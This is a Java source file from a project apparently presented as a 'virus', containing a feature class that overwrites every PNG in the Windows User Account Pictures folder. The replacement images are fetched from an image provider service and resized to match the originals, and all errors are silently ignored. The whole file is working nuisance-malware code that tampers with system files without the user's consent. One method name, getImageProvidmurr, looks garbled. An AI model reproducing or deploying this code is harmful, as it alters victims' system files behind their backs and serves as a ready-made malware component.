package me.bannock.virus.features.impl;

import me.bannock.virus.features.Feature;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.utils.WindowsUtils;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.Objects;

public class FeatChangeUserIcons extends Feature {

    @Override
    public void run() {
        if (!config.shouldSetUserIcons())
            return;

        final ImageProviderService imageProviderService = config.getImageProvidmurr();

        // Loop through every image in C:\ProgramData\Microsoft\User Account Pictures
        for(File image : Objects.requireNonNull(new File("C:\\ProgramData\\Microsoft\\User Account Pictures").listFiles())){
            if (!image.getName().toLowerCase().endsWith(".png"))
                continue;

            // Grab an image from the provider
            byte[] imageBytes = imageProviderService.fetchBytes(imageProviderService.fetchImages(1).get(0));

            // Create bufferedimage from bytes
            BufferedImage bufferedImage = null;
            try(InputStream inputStream = new ByteArrayInputStream(imageBytes)) {
                bufferedImage = ImageIO.read(inputStream);
            } catch (IOException e) {
                continue;
            }
            if (bufferedImage == null)
                continue;

            // Get the size of the png from the original file
            BufferedImage originalImage = null;
            try {
                originalImage = ImageIO.read(image);
            } catch (IOException e) {
                continue;
            }

            // Resize the image to match the size of the one we're replacing
            BufferedImage resizedImage = new BufferedImage(originalImage.getWidth(),
                    originalImage.getHeight(), BufferedImage.TYPE_INT_ARGB);
            // Draw our new image to the resized image
            resizedImage.getGraphics().drawImage(bufferedImage, 0, 0, originalImage.getWidth(),
                    originalImage.getHeight(), null);

            // Replace the file
            try {
                ImageIO.write(resizedImage, "png", image);
            } catch (Exception ignored) {}

        }

    }
}
